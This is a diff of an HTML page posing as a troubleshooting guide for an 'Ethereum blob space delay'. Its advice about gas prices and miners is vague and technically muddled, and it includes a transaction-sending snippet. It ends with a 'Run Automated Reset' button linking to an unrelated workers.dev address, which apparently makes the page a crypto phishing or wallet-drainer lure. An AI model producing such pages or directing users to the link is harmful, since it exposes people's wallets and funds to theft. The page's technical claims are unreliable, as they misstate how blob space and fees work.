@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,45 +41,34 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an Ethereum blob space delay. The delay affects the processing and confirmation of transactions, causing frustration and uncertainty for users.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues, resulting in frustrated users and potential financial losses.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Ethereum blob space delay occurs due to excessive demand for blob space, exceeding the available capacity. This leads to a backlog of transactions waiting to be processed, resulting in delays.</li>
+<li>The Ethereum blob space delay occurs when the network is congested, and the gas prices are too high, causing transactions to be stuck in the mempool, unable to be processed by miners due to insufficient gas.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transactions: <code>eth_estimateGas</code></li>
-<li>Adjust the transaction fee to incentivize miners: <code>eth_sendTransaction</code></li>
+<li>Increase the gas price to a competitive level to incentivize miners to process the transaction: </li>
+<li>Use a gas price estimation tool to determine the optimal gas price</li>
+<li>Manually set the gas price using a command-line interface or a wallet</li>
+<li>Monitor the transaction status and adjust the gas price as needed</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
-<span class="s1">        &quot;jsonrpc&quot;: &quot;2.0&quot;,</span>
-<span class="s1">        &quot;method&quot;: &quot;eth_sendTransaction&quot;,</span>
-<span class="s1">        &quot;params&quot;: [</span>
-<span class="s1">          {</span>
-<span class="s1">            &quot;from&quot;: &quot;0x...&quot;,</span>
-<span class="s1">            &quot;to&quot;: &quot;0x...&quot;,</span>
-<span class="s1">            &quot;value&quot;: &quot;0x...&quot;,</span>
-<span class="s1">            &quot;gas&quot;: &quot;0x...&quot;,</span>
-<span class="s1">            &quot;gasPrice&quot;: &quot;0x...&quot;</span>
-<span class="s1">          }</span>
-<span class="s1">        ],</span>
-<span class="s1">        &quot;id&quot;: 1</span>
-<span class="s1">      }&#39;</span>
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="o">({</span>
+<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;to&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...recipient_address&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...amount&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;gas&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...gas_limit&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;gasPrice&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...gas_price&quot;</span>
+<span class="o">})</span>
 </code></pre></div>
 
-<ul>
-<li>Monitor network congestion and adjust transaction timing accordingly: <code>eth_netStats</code>
-Consider utilizing an external console for more advanced troubleshooting and customization options. </li>
-</ul>
+<p>Consider utilizing an external console for more advanced troubleshooting and transaction management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of Ethereum network architecture</li>
-<li>Familiarity with transaction processing and gas mechanics</li>
-<li>Access to a compatible Ethereum client or node</li>
+<li>A basic understanding of Ethereum transactions and gas mechanics</li>
+<li>Access to a command-line interface or a compatible wallet</li>
+<li>A valid Ethereum account with sufficient funds to send transactions</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
